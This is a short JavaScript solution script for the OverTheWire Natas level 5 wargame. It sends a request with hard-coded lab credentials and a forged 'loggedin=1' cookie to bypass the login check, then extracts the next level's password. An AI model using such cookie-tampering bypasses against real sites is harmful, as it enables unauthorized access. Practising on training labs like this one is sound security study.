import axios from 'axios';

let username = 'natas5',
        password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq',
        pattern = /Access granted. The password for natas6 is (.*)/,
        url = `http://${username}.natas.labs.overthewire.org`;

try {

  let response = await axios.get(url, {auth: { username, password }, headers: {'Cookie': 'loggedin=1 '} });
  let result = response.data.match(pattern);
  console.log(result[1].slice(0, -6));

} catch (e) {
    console.error(e);
}

